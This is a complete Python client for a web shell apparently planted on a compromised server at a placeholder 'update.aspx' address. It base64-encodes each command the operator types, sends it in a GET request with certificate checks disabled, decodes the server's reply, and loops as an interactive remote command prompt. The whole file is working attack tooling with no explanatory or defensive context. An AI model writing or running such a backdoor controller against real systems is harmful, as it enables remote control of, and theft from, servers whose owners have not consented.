#!/usr/bin/env python3
import requests
import base64
import sys
import urllib3
urllib3.disable_warnings()

URL = "http://TARGET/update.aspx"

def run(cmd):
    encoded = base64.b64encode(cmd.encode()).decode()
    r = requests.get(f"{URL}?d={encoded}", verify=False, timeout=30)
    try:
        out = base64.b64decode(r.text).decode('utf-8', errors='ignore')
    except:
        out = r.text
    return out

# Interactive shell
print(f"[*] Connected to {URL}")
while True:
    try:
        cmd = input("cmd> ")
        if cmd in ('exit', 'quit'): break
        print(run(cmd))
    except KeyboardInterrupt:
        break
    except Exception as e:
        print(f"[!] {e}")
